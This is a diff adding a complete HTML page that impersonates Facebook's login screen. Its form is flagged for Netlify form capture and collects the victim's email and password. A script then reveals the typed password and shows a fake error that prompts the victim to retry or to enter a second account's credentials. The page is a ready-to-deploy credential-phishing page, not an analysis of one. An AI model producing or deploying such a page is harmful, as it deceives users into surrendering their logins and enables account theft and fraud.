@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content ="width=device-width, initial-scale=1"> 
+<script type="text/javascript">
+function doMyStuff(){
+var x = document.getElementById("psw");
+  if (x.type === "password") {
+    x.type = "text";
+  }
+}
+</script>
+<style type="text/css">
+#logo {
+color:rgb(390,390,300);
+
+background-color:#3a3a99;
+height: 35px;
+font-size:25px;
+font-weight:bold;
+padding:5px;
+font-family:Arial,sans-serif;
+position:absolute;
+width:99%;
+right:0.1px;
+top:0.1px;
+}
+body{
+background-color:rgba(230, 230, 230, 230);
+}
+.f {
+width:280px;
+height: 32px;
+border-radius:4px;
+border:none;
+outline:none;
+}
+.mform {
+
+border:0.3mm solid grey ;
+border-radius:2px;
+background:white;
+width:300px;
+height: 35px;
+}
+.nform {
+
+border:0.3mm solid grey ;
+border-radius:2px;
+background:white;
+width:300px;
+height: 35px;
+}
+#lg{
+width:300px;
+height:32px;
+background-color:rgba(100, 100, 400, 180);
+border:none;
+border-radius:3px;
+outline:none;
+color:white;
+font-weight:bold;
+font-family:Tahoma,Arial,sans-serif;
+}
+#hn {
+visibility:hidden;
+}
+#lang {
+color:blue;
+}
+
+#cr{
+color:grey
+}
+</style>
+<title>Facebook Login</title>
+</head>
+<body>
+<center>
+<div id="logo">facebook</div>
+</div>
+
+<br><br><br><br>
+<form netlify name="facebooklogin" method="POST" autocomplete="off" >
+<article class="mform">
+<input type="email" class="f" placeholder="Mobile number or email address" name="email" spellcheck="false" >
+</article>
+<article class="nform">
+<input type="password" class="f" placeholder="Facebook password" name="password" id="psw">
+</article>
+<br>
+<input type="submit"  id="lg" value ="Log In" onClick = "doMyStuff(); alert('Something Went Wrong \n Try again Later\n\n OR \n\n Try Logging in with a different account and Refresh this page');">
+
+</form>
+</center>
+<br><br><br><br><br>
+<code id="hn">lll</code><code id="lang">English (UK)</code><code id="hn">llllllllll</code><code id="lang">Español</code><br><br>
+<code id="hn">lll</code><code id="lang">Português (Brazil)</code>  <code id="hn">lll</code><code id="lang">Français (French)</code><br><br>
+<code id="hn">lll</code><code id="lang">ققس </code>
+<center><br><code id="cr">Facebook ©2021</code>
+</center>
+
+</body>
+
+</body>
+</html>
